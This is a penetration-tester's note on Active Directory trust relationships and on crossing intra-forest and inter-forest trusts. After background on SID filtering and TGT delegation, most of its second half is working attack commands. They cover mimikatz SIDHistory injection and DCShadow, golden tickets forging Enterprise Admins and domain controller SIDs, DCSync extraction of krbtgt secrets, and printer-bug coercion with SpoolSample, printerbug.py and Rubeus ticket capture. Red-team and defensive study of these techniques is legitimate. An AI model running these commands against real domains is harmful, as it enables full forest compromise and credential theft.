# Active Directory - Trusts hopping

### Overview

Trust relationships define an administrative and security link between two
Windows forests or domains. They enable a user to access resources that are
located in a forest or domain that's different from the user's own forest
or domain.

###### Trusts directions

The direction of an Active Directory trust relationship defines the direction
of the accesses and can be:
  - `one-way`, given by one forest or domain, the `trusting object`, to another
  domain or forest, the `trusted object`.
  - `bidirectional` or `two-ways`, meaning are reciprocated by both objects
  forming the trust. A `bidirectional` trust is actually implemented as two
  `one-way` trusts.

The `trusting object` will define `outbound` trusts with the objects that it
directly trust. Reciprocally, the `trusted object` will define an `inbound`
trust with object that directly trust it.

###### Transitivity

A `transitive trust` is a trust that is extended not only to the directly
trusted object, but also to each objects that the trusted object trusts. A
transitive trust will thus give access to the resources of the trusting domain
to all domains or forests that are trusted by the trusted object defined in the
trust.

A trust that is non transitive will limit access to the resources of the
trusting object only to the trusted domain or forest and will not extend to any
other object.

###### Default and possible trusts

All domains in a forest trust each others by default. External trusts can also
be configured between domains of different forests.

The following different types of trusts are or can be configured in Active
Directory (either by default or manually):

| Scope | Trust type | Direction | Transitivity | Description |
|-------|------------|-----------|--------------|-------------|
|  Intra-forest | Parent-Child | Two-way | Transitive | Created automatically between a child domain and its domain parent. |
| Intra-forest | Tree-Root | Two-way | Transitive | Created automatically when a new Tree is added to a forest. |
| Intra-forest | Shortcut | One-way or two-way | Transitive | Created manually to improve performance between two domains in the same forest. |
| Inter-forests | External | One or two-way | Non-transitive by default | Manually created trusts between domains of different forests. |
| Inter-forests | CrossForest <br/> / <br/> Forest trust | One or two-way | Non-transitive | Manually created trusts between different forests, which makes one forest transitively trust all of the domains in the other forest. <br/> Forest trusts are not extendable to others forests: a trust between one forest and another does not extend to the eventual trusted forests of each forest.  |
| Other | Realm | One-way or two way | Transitive or non-transitive | Manually created trusts between an Active Directory forest and a non-Windows Kerberos directory. |

###### Authentication mechanisms for Active Directory trusts

Both the `Kerberos` and the `NTLM` protocols are used for authentication
across Active Directory trusts. An authentication is first attempted using the
`Kerberos` protocol and, in case of failure, a rollback authentication is made
through the `NTLM` protocol.

If the authentication is made through the `Kerberos` protocol, a new `Kerberos`
ticket is issued to the user: the `referral ticket`. This ticket corresponds to
a reissue of the user's current `Ticket-Granting Ticket (TGT)` encrypted with
one of the secrets (`RC4`, corresponding to the `NTLM hash`, or
`AES 128/256 bits` keys) of the `trust account`.

The referral tickets, as with any other `Kerberos` tickets, contain the user
authentication information (`SID`, eventual extra `SIDs` and the user's groups)
in its `Privilege Attribute Certificate (PAC)`. The `referral tickets` are
subsequently used to request `service tickets (ST)` and access resources in the
trusting domain or forest.

###### Authentication and access control across trusts

The access to securable resources, that is resources that define a `security
descriptor`, is based on a `security principal`'s `SID`, eventual extra `SIDs`,
and `security group SIDs`. Indeed, these `SIDs` are compared to the access
rights defined in the `Access Control Entries (ACEs)` of the accessed object's
`Discretionary Access Control List (DACL)`.

Users, computer machine accounts, and `Global` and `Universal` security groups
of the trusted domain or forest can be added to `Domain local` security groups
of the trusting domain or forest. As the `Domain Admins` and
`Enterprise Admins` groups are, respectively, `Global` and `Universal` security
groups, only the built-ins `Administrators` and `Operators` groups (and others
non-default `Domain Local` security groups) can be used to grant privileges to
security principals of a trusted domain / forest in the trusting domain /
forest. For instance, the trusted domain / forest's `Domain Admins` group can
be added to the `Administrators` group of the trusting forest but the trusted
forest's `Administrators` group cannot.

The `SIDs` that are not from the trusted domain or forest are subject to the
`SID filtering` security mechanism.

###### Security mechanism: SID filtering

A filtering policy governs the `Security Identifiers (SIDs)` that can be used
for authentication and access control through Active Directory trusts. The
filtering depends on the type of the trust, the `SID`, as well as the
activation or not of the security filtering mechanism known as `SID filtering`.
This filtering applies on the current `SID` of the account as well as any
`SIDs` present in the user `SIDHistory` attribute.

`SIDs` are categorized into the following classes, with specific rules being
applied to each class:

| Category | Rule |
|----------|------|
| `AlwaysFilter` | The `SIDs` categorized as `AlwaysFilter` are never allowed across any trust (both `intra-forest` or `inter-forests`) boundaries. |
| `ForestSpecific` | The `SIDs` categorized as `ForestSpecific` are never allowed across `inter-forests` trusts and are not allowed across `intra-forest` marked as `QuarantinedWithinForest`. |
| `EDC` | Only the well known `Enterprise Domain Controllers` `SID` (`S-1-5-9`) is categorized as `EDC`. <br/> This `SID` is always filtered across `inter-forests` trusts but always allowed across `intra-forest` trusts (even for trusts marked as `QuarantinedWithinForest`). |
| `DomainSpecific` | *This category has disappeared for Active Directory domains with a functional level of `Windows Server 2012` and is now unified with the `ForestSpecific` category.* <br/><br/> The `SIDs` in this category are considered local to the present domain and are filtered across the trust. |
| `NeverFilter` |  The `SIDs` categorized as `NeverFilter` are always allowed across any trust boundaries. |

*SID categorization*

| `SID` / `SID` pattern | Associated principal | Category |
|-----------------------|----------------------|----------|
| `S-1-5-9` | Enterprise Domain Controllers | EDC |
| `S-1-5-21-<Domain>-R` <br/><br/> R < 500 | Well-known SID range | ForestSpecific |
| `S-1-5-21-<Domain>-500` | Administrator | ForestSpecific |
| `S-1-5-21-<Domain>-502` | Krbtgt | ForestSpecific |
| `S-1-5-21-<Domain>-512` | Domain Admins | ForestSpecific |
| `S-1-5-21-<Domain>-516` | Domain Controllers | ForestSpecific |
| `S-1-5-21-<Domain>-517` | Cert Publishers | ForestSpecific |
| `S-1-5-21-<Domain>-518` | Schema Admins | ForestSpecific |
| `S-1-5-21-<Domain>-519` | Enterprise Admins | ForestSpecific |
| `S-1-5-21-<Domain>-520` | Group Policy Creator Owners | ForestSpecific |
| `S-1-5-21-<Domain>-R` <br/><br/> 500 <= R < 1000 | Reserved domain-specific values | ForestSpecific |
| `S-1-5-21-<Domain>-R` <br/><br/> R >= 1000 | Identifiers for non-default domain users and groups | Not filtered at `intra-forest` and `external` as well as `cross-forest` with out `SID Filtering`	trust boundaries. <br/><br/> Filtered at `intra-forest` trusts marked as `QuarantinedWithinForest`, and quarantined `external` and `cross-forest` trusts boundaries.
| `S-1-5-32-544` | Administrators | AlwaysFilter |
| `S-1-5-32-547` | Power Users | AlwaysFilter |
| `S-1-5-32-548` | Account Operators | AlwaysFilter |
| `S-1-5-32-549` | System Operators | AlwaysFilter |
| `S-1-5-32-550` | Print Operators | AlwaysFilter |
| `S-1-5-32-551` | Backup Operators | AlwaysFilter |
| `S-1-5-32-555` | Remote Desktop Users | AlwaysFilter |
| `S-1-5-32-R` | Other Built-in Accounts | AlwaysFilter |

*SID filtering policy for intra-forest trusts*

`SID filtering` is by default disabled for all `intra-forest` trusts. Any
eventual extra `SIDs` or `security group SIDs`, except the `SIDs` categorized
as `Alwaysfiltered`, will thus be taken into account for the authorization and
access control process whenever accessing resources through an `intra-forest`
trust. In an Active Directory forest with trusts in their default
configuration, the initial compromise of a domain of the forest can lead to the
full compromise of the forest.

A form of `SID filtering` can be configured on `intra-forest` trusts by marking
the trusts as `QuarantinedWithinForest`. In such configuration, the
`trustAttributes` attribute of the `TDO` object defining the trust has its
`TRUST_ATTRIBUTE_QUARANTINED_DOMAIN` bit set. The only `SIDs` that will be
allowed across the trust are the `SIDs` from the trusted domain, the `SID`
`Enterprise Domain Controllers` (`S-1-5-9`), categorized as `EDC`, and "the
SID described by the `Trusted Domain Object (TDO)`".

Note that activation of the `QuarantinedWithinForest` mechanism
for `intra-forest` trusts may give rise to operational issues and is not
recommended. This is why the forest is commonly considered as a security
boundary while the domain only as an operational boundary.

*SID filtering policy for inter-forests trusts*

The `SIDs` categorized as `Alwaysfiltered` and `ForestSpecific` are filtered
across all `inter-forests` trusts (`CrossForest` and `External`) boundaries.

For `External` trusts, non-default domain users and groups `SIDs`, in the
format `S-1-5-21-<Domain>-R` with `R >= 1000`, are not filtered.

`SID filtering` is however by default enabled for all `CrossForest` trusts and
all `SIDs` that do not directly refer to the trusted domain or forest are
filtered across the trust boundaries. This filtering can be relaxed by
disabling the `SID filtering` mechanism. In such configuration, the
`trustAttributes` attribute of the `TDO` object defining the trust has its
`TRUST_ATTRIBUTE_TREAT_AS_EXTERNAL` bit set and the trust is considered, for
`SID` filtering, as an `External` trust (thus allowing non-default `SIDs`
across the trust).

###### Security mechanism: TGT delegation

Security mechanisms restricting the delegation of `Ticket-Granting Ticket
(TGT)` through `Kerberos unconstrained delegation` across trust boundaries were
introduced in March - July 2019 security updates. The features were
implemented on `Windows Server 2012`, and later, as well as backported to
`Windows Server 2008`.

The restriction are implemented through two trust flags stored in the
`trustAttributes` attribute of `TDO` objects:
  - `CROSS_ORGANIZATION_NO_TGT_DELEGATION`
  - `CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION`

As of `July 2019`, `TGT` delegation is by default disabled and must be
explicitly enabled which result in the setting of the
`CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION` flag. The
`CROSS_ORGANIZATION_NO_TGT_DELEGATION` must also be unset in order for the
 `TGT` delegation to be effective.

In essence:
  - If the `CROSS_ORGANIZATION_NO_TGT_DELEGATION` is set, `TGT` delegation is
    disabled if all Domain Controllers are running `Windows Server 2012` (or
    newer) or `Windows Server 2008 / 2008 R2` with March 2019 security updates.
  - If the `CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION` flag is set (while the
    `CROSS_ORGANIZATION_NO_TGT_DELEGATION` flag is not) `TGT` delegation is
    possible across the trust (independently of the level of patching of the
    Domain Controllers).
  - if neither flags are set, `TGT` delegation is allowed if Domain
    Controllers do not have the May 2019 security updates.

###### Security mechanism: selective authentication

By default, any users of the trusted domain or forest can authenticate to the
`Domain Controllers` of the trusting domain or forest. This results in the
possibility of conducting authenticated enumeration of the objects of the
trusting domain / forest by all the users of the trusted domain / forest.

The `selective authentication` security restricts the authentication to
specifically defined security principals.

### Forest and domain trusts enumeration

Various tools or utilities can be used to retrieve the trusts defined for a
domain or at the forest level:

```
# Windows built-in command-line utility.
# Relies on the DsEnumerateDomainTrusts Win32 API and returns limited information:
nltest /trusted_domains

# PowerShell - Active Directory module / PowerView.
# Relies on LDAP queries and returns more exhaustive results.
Import-Module ActiveDirectory / Import-Module <PATH\Microsoft.ActiveDirectory.Management.dll>
Import-Module <PATH\PowerView.ps1>

# Trusts ONLY of the current domain. Does not recursively enumerates trusts of others domains in the forest.
Get-ADTrust -Filter *
Get-ADTrust -Filter * | Ft Name, Direction, DisallowTransivity, SIDFilteringQuarantined, SIDFilteringForestAware, TGTDelegation
Get-DomainTrust

# Enumerates all the trusts of the current forest.
(Get-ADForest).Domains | ForEach-Object { Get-ADTrust -Server $_ -Filter * -Properties *  | Ft Name, Direction, DisallowTransivity, SIDFilteringQuarantined, SIDFilteringForestAware, TGTDelegation }
Get-ForestTrust
```

In additions, more comprehension and automated Active Directory scanners
implemented in `.NET`, such as `BloodHound` or `PingCastle`, include modules to
enumerate trusts information. Refer to the `[ActiveDirectory] AD scanner` note
for more information on how to conduct enumeration using automated scanners.

### Intra-forest trusts hopping

`Intra-forest` trusts that are not marked as `QuarantinedWithinForest` can be
jumped after the initial compromise of a domain by simply adding the
`Enterprise Admins` security group `SID` in the `SIDHistory` of an
user of the compromised domain or directly in the `extra SIDs` field of a
crafted `Kerberos ticket`. Alternatively, an `Enterprise domain controller` can
be impersonated in order to conduct `DCSync` attacks on the root domain with
out generating `Windows Security` events and possibly raising security alerts.

###### Jumps using the SID History attribute

Under normal circumstances, `SIDs` will only be added (automatically) to the
`SIDHistory` attribute of a security principal during domain migration and
cannot be manually added (but can be manually removed).

This restriction can be bypassed and `SIDs` added to a `security principal`'s
`SIDHistory` attribute with `mimikatz` by either:
  - executing code locally on a Domain Controller to patch its `NTDS` service
  - registering a rogue Domain Controller to inject and replicate arbitrary
    modifications (attack known as `DCShadow`)

The following command can be used to validate the `SIDHistory` attribute
modification:

```
Get-ADObject -Filter "(SamAccountName -eq '<SAMACCOUNTNAME>')" -Properties SIDHistory
```

*SID History modification through local patch of the NTDS service*

This technique of modification of the `SIDHistory` attribute requires
privileges granted to the `Domain Admins` group and must be conducted on a
Domain Controller as the `Windows NT Directory Services (NTDS)` service must be
locally patched. While the `SID History` modification will persist, the `NTDS`
service patch will not be persistent across reboot of the Domain Controller.

`mimikatz`'s `sid` module can be used to add `SIDs` in the `SIDHistory`
attribute of any users of the current domain (the following commands must be
executed directly on a Domain Controller):

```
# If necessary, elevate privileges to "NT AUTHORITY\SYSTEM" and enables the "SeDebugPrivilege" privilege.
mimikatz # token::elevate
mimikatz # privilege::debug

# Patches the ntds service.
# Only the first patch ("Patch 1/2 ntds service patched") is required for the attack (the second patch may rise an error, such as "ERROR kull_m_patch_genericProcessOrServiceFromBuild", with out incidence).
mimikatz # sid::patch

# Adds the given SID in the SIDHistory attribute of the specified user.
# S-1-5-21-<FOREST_DOMAIN>-519: SID of the "Enterprise Admins" group for example.
mimikatz # sid::add /sam:<SAMACCOUNTNAME> /new:<S-1-5-21-<FOREST_DOMAIN>-519 | EXTRA_SID>
```

*SID History modification through DCShadow*

The restriction on the modification of the `SIDHistory` attribute can be also
bypassed through a `DCShadow` attack to arbitrarily set an account `SIDHistory`
attribute. For more details on the `DCShadow` attack, refer to the
"DCShadow ACL" section of this note.

**This technique will override any `SID(s)` currently present in the `security
principal`'s `SIDHistory` attribute.**

```
# Two mimikatz interpreters (executed on a machine member of the domain) are required for the DCShadow attack:
# One running as "NT AUTHORITY\SYSTEM", the second as a domain user with enough privileges to conducted the DCShadow attack (usually a "Domain Admins").
# The following mimikatz commands must be executed sequentially (the /push must be done after the operation as been entered).

# First interpreter (executed as "NT AUTHORITY\SYSTEM").
mimikatz # lsadump::dcshadow /object:<USERNAME> /attribute:SIDHistory /value:<S-1-5-21-<FOREST_DOMAIN>-519 | SID>

# Second interpreter (executed as the privileged domain account).
mimikatz # lsadump::dcshadow /push
```

###### Jumps using Kerberos Golden tickets

The `mimikatz`'s `kerberos::golden` module can be used to generate `golden
tickets` that may include arbitrary `extra SIDs` as well as arbitrary `group
identifiers`. A golden ticket for the current domain can be generated, using
one of the secrets of the current domain's `krbtgt` account, to include `SIDs`
or `group identifiers` related to the root domain of the forest. The specified
`SIDs` and / or `group identifiers` will, respectively, populate the
`ExtraSids` and `GroupIds` fields of the ticket's `Privilege Attribute
Certificate (PAC)`. For example, specification of the `SID` of the `Enterprise
Admins` group (`S-1-5-21-<ROOTDOMAIN_ID>-519`) will effectively impersonate
membership to the group and grant full access to the domains in the forest.

Through this level of privileges, the secrets of the `krbtgt` account can be
retrieved through  `DRSUAPI` replication functions, attack known as `DCSync`,
or extracted from the Active Directory database `ntds.dit` after exfiltration
from a Domain Controller. The secrets of `krbtgt` account can then further be
used to craft `Golden tickets` for the root domain of the forest. For more
information, refer to the `[ActiveDirectory] ntds.dit dumping` and
`[ActiveDirectory] Golden Tickets` notes.

```
# Retrieves the FQDN and SID of the current domain for the /sid:<CHILD_DOMAIN_SID> parameter.
Get-ADDomain | Ft Name,DNSRoot,DomainSID
Get-ADDomain -Server <DC_IP | DC_HOSTNAME> -Credential <PSCREDENTIAL> | Ft Name,DNSRoot,DomainSID

# Retrieves the SID of the root domain of the forest, for any /sids:<IMPERSONATED_SIDS>.
Get-ADForest | Ft RootDomain
Get-ADForest -Server <DC_IP | DC_HOSTNAME> -Credential <PSCREDENTIAL> | Ft RootDomain
Get-ADDomain <ROOTDOMAIN> | Ft Name,DistinguishedName,DomainSID

# /sids:<IMPERSONATED_SID | LIST_IMPERSONATED_SIDS>: SID, or comma-separated list of SIDs, to add in the "ExtraSids" field of the crafted ticket's PAC.
# For example, to impersonate membership to the "Enterprise Admins" group: /sids:S-1-5-21-<ROOTDOMAIN_ID>-519
# /ptt: Injects the ticket directly in the current session.
mimikatz # kerberos::golden /user:<IMPERSONATED_USERNAME> [/rc4:<CHILD_DOMAIN_KRBTGT_NTLM> | /aes128:<CHILD_DOMAIN_KRBTGT_AES128> | /aes256:<CHILD_DOMAIN_KRBTGT_AES256>] /sid:<CHILD_DOMAIN_SID> /domain:<CHILD_DOMAIN_FQDN> /sids:<IMPERSONATED_SID | LIST_IMPERSONATED_SIDS> /ptt

# Impersonates an Enterprise domain controller to conduct DCSync attack with out raising Windows Security events

# /sids:<IMPERSONATED_SIDS>: S-1-5-21-<ROOTDOMAIN_ID>-516,S-1-5-9
# S-1-5-21-<ROOTDOMAIN_ID>-516: SID of the "Domain Controllers" group of the root domain.
# S-1-5-9: SID of the "Enterprise Domain Controllers" group.
mimikatz # kerberos::golden /user:<CHILD_DOMAIN_DC_NAME$> [/rc4:<CHILD_DOMAIN_KRBTGT_NTLM> | /aes128:<CHILD_DOMAIN_KRBTGT_AES128> | /aes256:<CHILD_DOMAIN_KRBTGT_AES256>] /sid:<CHILD_DOMAIN_SID> /domain:<CHILD_DOMAIN_FQDN> /id:<CHILD_DOMAIN_DC_SID> /groups:516 /sids:S-1-5-21-<ROOTDOMAIN_ID>-516,S-1-5-9 /ptt
```

### Inter-forests trusts hopping

###### External and CrossForest trusts with out SID Filtering

`Inter-forests` `external` and `CrossForest` trusts with out `SID Filtering`
can be jumped by impersonating non-default security principals (`SID`
`S-1-5-21-<Domain>-R` with R >= 1000). Depending on the targeted Active
Directory domain configuration, this level of impersonation can likely be
leveraged to elevate privileges on the domain or take control of the non-tier 0
assets (servers and workstations) in a properly hardened domain implementing an
administrative tiering model.

Among many possibilities, the following techniques may be leveraged:

  - Impersonation of membership to the `DnsAdmins` non built-in `domain local`
    group. Members of the `DnsAdmins` group can load and execute an arbitrary
    `Dynamic Link Library (DLL)` on the servers executing the Active Directory
    `DNS` service (usually the Domain Controllers). Refer to the
    `[ActiveDirectory] Operators to Domain Admins` note for more information on
    how to leverage impersonation of membership to the `DnsAdmins` group for
    privilege escalation.

    ```
    (Get-ADGroup -Identity "DnsAdmins").SID

    mimikatz # kerberos::golden /user:<IMPERSONATED_USERNAME> [/rc4:<CHILD_DOMAIN_KRBTGT_NTLM> | /aes128:<CHILD_DOMAIN_KRBTGT_AES128> | /aes256:<CHILD_DOMAIN_KRBTGT_AES256>] /sid:<CHILD_DOMAIN_SID> /domain:<CHILD_DOMAIN_FQDN> /sids:<IMPERSONATED_SID_DNSADMINS_GROUP> /ptt
    ```

  - Impersonation of membership to non built-in groups having the necessary
    rights to make replication requests through the `DRSUAPI` functions
    (`DCSync` attack). For environment with an on-premise Exchange
    infrastructure with out the `February 12th 2019` security update applied,
    the non-default `Exchange Trusted Subsystem` and `Exchange Windows
    Permissions` security group may be (indirectly) granted such privileges.
    Indeed, for such Exchange installation in `Shared permissions` (default) or
    `RBAC split` permissions (common), the `Exchange Windows Permissions` group
    is granted `WriteDacl` on the `Domain root` object (which can be abused to
    grant oneself replication rights).

  - Impersonation of membership to non built-in groups having administrator
    privileges on the tier 1 or 2 assets. Such groups can be identified
    through:
      - Local groups enumeration. Refer to the `[ActiveDirectory] Credentials
        theft shuffling` note for more information on how to enumerate members
        of the local `Administrators` groups.

      - Enumeration of the security principals having delegated read access to
        the `LAPS` password of multiple computers. The
        `Find-LAPSDelegatedGroups` PowerShell cmdlet can be used to conduct
        this enumeration. Refer to the `[ActiveDirectory] ACL exploiting` note
        for more information.

      - Groups naming convention, with the potential use of keywords such as
        "adm", "admin", etc. to tag privileged groups.

        ```
        Get-ADUser -Filter 'Name -like "*adm*"'
        ```

###### External and CrossForest trusts with SID Filtering - "Printer Bug"

Bidirectional `External` and `CrossForest` trusts with `SID Filtering` enabled
may be jumped by leveraging a `Kerberos` `unconstrained delegation` on the
source forest and the `Print Spooler` service on a Domain Controller of the
targeted forest.

The attack is based on the fact that a `MSRPC` function exposed by the
`Print Spooler` service (on the `MS-RPRN` interface) can be used to force the
machine running the service to authenticate to a specified remote system.
If the `Print Spooler` service is exposed on a Domain Controller, a `Kerberos`
authentication of the Domain Controller machine account can thus be triggered
to a controlled machine trusted for `unconstrained delegation`. This `Kerberos`
authentication will result in the `TGT` of the Domain Controller machine
account to be sent and further retrievable on the controlled machine. The
obtained `TGT` can be used to request `Kerberos` `service tickets` under the
identity of the Domain Controller, to conduct, for example replication
operations (`DCSync`).

The attack requires the following prerequisites to be satisfied:
  - An `External` and `CrossForest` trusts allowing `TGT` delegation. Refer to
    the "Security mechanism: TGT delegation" overview for the conditions in
    which this can be the case.
  - The `Print Spooler` service to be enabled and exposed to at least one
    Domain Controller of the targeted forest.
  - The control of a machine configured for `unconstrained delegation` on the
    source forest side. All Domain Controllers are by default trusted for
    `unconstrained delegation`.

*Identification and authentication trigger of Domain Controllers exposing the `Print Spooler` service*

Multiple tools can be used to scan the Domain Controllers of the targeted
forest for exposed `Print Spooler` services:

```
PingCastle.exe --scanner spooler --scmode-dc --server <TARGET_FOREST_DC_FQDN>

Get-ADDomainController -DomainName <FOREST_NETBIOS_NAME | FOREST_FQDN> -Discover -ForceDiscover | ForEach-Object { gci \\$_\pipe\spoolss }
Get-ADDomainController -DomainName <FOREST_NETBIOS_NAME | FOREST_FQDN> -Discover -ForceDiscover | ForEach-Object { Get-SpoolStatus $_ }

rpcdump.py '<DOMAIN>/<USERNAME>:<PASSWORD>@<IP | HOSTNAME> | grep -i "MS-RPRN"
```

The `printerbug.py` Python script and `SpoolSample` can be used to trigger an
authentication request to the specified host (using its hostname to generate
a Kerberos authentication):

```
SpoolSample.exe <TARGET_IP | TARGET_HOSTNAME> <LHOST_HOSTNAME>

printerbug.py [<DOMAIN>/]<USERNAME>[:<PASSWORD>]@<TARGET_IP | TARGET_HOSTNAME> <LHOST_HOSTNAME>
```

For more information, refer to the `[L7] MSRPC - MS-RPRN "printer bug"` note.

*Optional - configuration of unconstrained delegation on a controlled machine*

The Domain Controllers are trusted for `Kerberos` `unconstrained delegation`.

However, if a Domain Controller (exposing the `Print Spooler` service) of the
targeted forest is accessible from the attacking machine, a computer can be
joined to the domain and configured to be trusted for `unconstrained
delegation`. Doing so will allow to jump the trust with out deploying third
party tools on a Domain Controller.

```
Add-Computer -DomainName <DOMAIN> -Server <DOMAIN>\<DC_HOSTNAME> -Credential <<DOMAIN>\<USERNAME> | <PSCredential>> -Restart -Force

Get-ADComputer -Identity <CONTROLLED_MACHINE_HOSTNAME> | Set-ADAccountControl -TrustedForDelegation $True
```

*TGT extraction and usage*

The `TGT` of the Domain Controller machine account received after triggering
the `Print Spooler` service authentication can be extracted using `Rubeus`'s
`monitor` module:

```
# The TGTs will be extracted every 60 seconds by default.
Rubeus.exe monitor /nowrap /interval:<2 | INTERVAL_IN_SECONDS>
```

The base64 encoded ticket can be injected in the current session using, among
others, `Rubeus`'s `ptt` module:

```
Rubeus.exe ptt /ticket:<TICKET_BASE64 | TICKET_BASE64_FILE_PATH | TICKET_KIRBI_FILE_PATH>

# Confirms that the TGT is injected in the current session.
klist

  #X>     Client: <DC_MACHINE_ACCOUNT>$ @ <DOMAIN_FQDN>
          Server: krbtgt/<DOMAIN_FQDN> @ <DOMAIN_FQDN>
```

Replication operations, attack known as `DCSync`, can then be conducted,
using `mimikatz` for example, through the session in which the Domain
Controller machine account's `TGT` was injected. The specified Active
Directory objects' sensible information (`NTLM` hash and `Kerberos` secrets)
can be remotely retrieved.

```
mimikatz # lsadump::dcsync /domain:<DOMAIN_FQDN> /dc:<DC_FQDN> /user:<krbtgt | USERNAME>
```

For more information on how to make use of the obtained `TGT` and conduct the
`DCSync` attack, notably from a Linux attacking machine, refer to the
`[ActiveDirectory] Kerberos tickets usage` and `[ActiveDirectory] ntds.dit
dumping` notes.
